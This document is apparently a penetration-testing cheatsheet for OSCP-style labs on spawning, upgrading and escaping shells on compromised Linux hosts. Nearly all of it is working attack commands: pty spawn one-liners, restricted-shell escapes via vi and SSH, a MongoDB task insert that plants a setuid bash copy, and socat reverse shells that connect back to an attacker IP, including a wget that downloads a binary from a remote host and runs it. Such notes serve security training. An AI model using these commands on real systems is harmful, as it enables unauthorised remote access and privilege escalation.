This Is The Cheatsheet: [Spawning Shells · Total OSCP Guide (gitbooks.io)](https://sushant747.gitbooks.io/total-oscp-guide/content/spawning_shells.html)

If you don't have a **TTY-shell** you can't run `su`, `sudo`.

# Non-Interactive TTY Shell

**Python**
```python
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# OR
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

**Echo**
```sh
echo "os.system('/bin/bash')"
```

**sh**
```sh
/bin/sh -i
```

**bash**
```bash
/bin/bash -i
```

**Perl**
```perl
perl -e 'exec "/bin/sh";'
```

**From within VI**
```sh
:!bash
```

---
# Break out of a Restricted Shell
If you can't run basic commands in a shell, it's `rbash`

#### Method 1: PATH/VIM
1) Try to change the [[Path]] variable
![[Pasted image 20231114142221.png]]
```sh
export PATH=/bin:/usr/bin
```

2) If you can't do that, make `.exrc` file
You can store commands and settings that you want executed any time you start the vi or ex editors.
```sh
vi .exrc

# In .exrc
set exrc
set shell=/bin/bash
```

Launch the shell again
```sh
vi
:! /bin/bash
```

If it's successful, then set the [[Path]] variable


#### Method 2: SSH
After logging from SSH, if there is a restricted shell, you can easily break out of the shell by connecting back using this command
```sh
ssh seppuku@192.168.120.206 -t "bash --noprofile"
```
If it's successful, then set the [[Path]] variable

---
# Explanation

`xterm-256color`: Setting TERM to xterm-256color tells the system and applications that the terminal supports 256 colors and can handle advanced text formatting and color output.

`stty rows 67 columns 318` :-
- **stty**:  This command is used to configure and display terminal settings. It stands for "set terminal type."
- **rows 67 columns 318**: These arguments specify the desired number of rows and columns for the terminal's display area. In this case, it's setting the terminal to have 67 rows and 318 columns.

---
# MongoDB Reverse Shell
If MongoDB or app.js is being run as a user (tom in this case), then login to the mongo db & get a reverse shell
```js
db.tasks.insert({"cmd":"/bin/cp /bin/bash /tmp/tom; /bin/chown tom:admin /tmp/tom; chmod
g+s /tmp/tom; chmod u+s /tmp/tom"});
```

OR
Use a Node.js reverse shell & start listener
![[Pasted image 20240319003821.png]]

---
# Interactive TTY Shell
## Method 1: Socat
If `socat` is installed on the victim server, you can launch a reverse shell with it.

```sh
# On Kali-Linux
socat file:`tty`,raw,echo=0 tcp-listen:4444

# On Victim Machine
chmod +x /tmp/socat
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.45.161:4444
```

```sh
# If Socat isn't installed on Victim Machine
wget -q https://10.8.139.254/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[IP]:4444
```


## Method 2: Upgrade from [[Netcat & Ncat]]
```sh
# In reverse shell
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z


# In Kali
## Check number of rows and cols of our kali linux
stty -a
stty raw -echo
fg

# In reverse shell (nums and columns of your kali machine)
reset
export SHELL=bash
export TERM=xterm-256color
stty rows 36 columns 189
```


# Get Full shell as a User
```sh
# If you are still in another user's group like this
hatter@wonderland:/home/rabbit$ whoami;id
hatter
uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)

# Find the password & su for a full shell
hatter@wonderland:~$ su hatter
hatter@wonderland:~$ id
uid=1003(hatter) gid=1003(hatter) groups=1003(hatter)
```
